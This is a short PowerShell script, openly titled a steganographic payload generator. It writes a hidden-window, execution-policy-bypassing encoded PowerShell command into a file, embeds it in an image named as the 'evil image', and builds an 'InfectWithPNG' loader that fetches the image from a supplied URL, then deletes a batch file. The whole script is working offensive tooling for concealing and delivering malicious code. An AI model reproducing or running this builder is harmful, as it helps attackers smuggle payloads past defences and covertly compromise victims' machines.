# Generate steganographic payload
$enc=$args[0]
$imu=$args[1]
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
$evilimage = "$ScriptDir\Build\dog.png"

md $ScriptDir\Package\png;
#md $ScriptDir\Package\bat;

function runStegoPNG {
Import-Module $ScriptDir\Build\stego.ps1
echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > $ScriptDir\Package\bat\pnt.ps1
Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath $evilimage -ImageDestinationPath $ScriptDir\Package\png\image.png -PayloadSource Text -PayloadPath $ScriptDir\Package\bat\pnt.ps1
Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $imu -PayloadSource Text -PayloadPath $ScriptDir\Package\png\InfectWithPNG.txt
}
runStegoPNG
del $ScriptDir\st.bat